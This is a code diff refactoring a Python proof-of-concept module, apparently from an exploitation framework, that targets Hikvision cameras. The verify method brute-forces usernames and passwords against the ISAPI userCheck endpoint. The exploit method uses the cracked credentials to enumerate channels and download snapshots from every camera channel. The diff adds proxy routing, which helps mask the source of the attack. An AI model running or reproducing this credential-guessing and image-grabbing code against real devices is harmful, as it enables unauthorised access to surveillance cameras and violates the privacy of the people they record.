@@ -17,18 +17,20 @@ class HikvisionWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.medium
         self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
 
     def verify(self, ip, port=80):
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
                     r = requests.get(
-                        url=f"http://{ip}:{port}/ISAPI/Security/userCheck",
+                        url=self._get_url(ip, port, '/ISAPI/Security/userCheck'),
                         auth=(user, password),
                         timeout=self.config.timeout,
-                        headers=self.headers,
-                        verify=False
+                        headers=headers,
+                        verify=False,
+                        proxies=proxies,
                     )
                     if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                         return ip, str(port), self.product, str(user), str(password), self.name
@@ -38,23 +40,25 @@ class HikvisionWeakPassword(POCTemplate):
 
     def exploit(self, results):
         ip, port, product, user, password, vul = results
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         channels = 1
         try:
             res = requests.get(
-                f"http://{ip}:{port}/ISAPI/Image/channels",
+                self._get_url(ip, port, '/ISAPI/Image/channels'),
                 auth=HTTPDigestAuth(user, password),
-                headers=self.headers,
+                headers=headers,
                 timeout=self.config.timeout,
-                verify=False
+                verify=False,
+                proxies=proxies,
             )
             channels = len(ElementTree.fromstring(res.text))
         except Exception as e:
             logger.error(e)
 
-        # 获取每个通道的图片
         res_list = []
         for channel in range(1, channels + 1):
-            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
+            url = self._get_url(ip, port, f'/ISAPI/Streaming/channels/{channel}01/picture')
             img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
             res_list.append(
                 self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
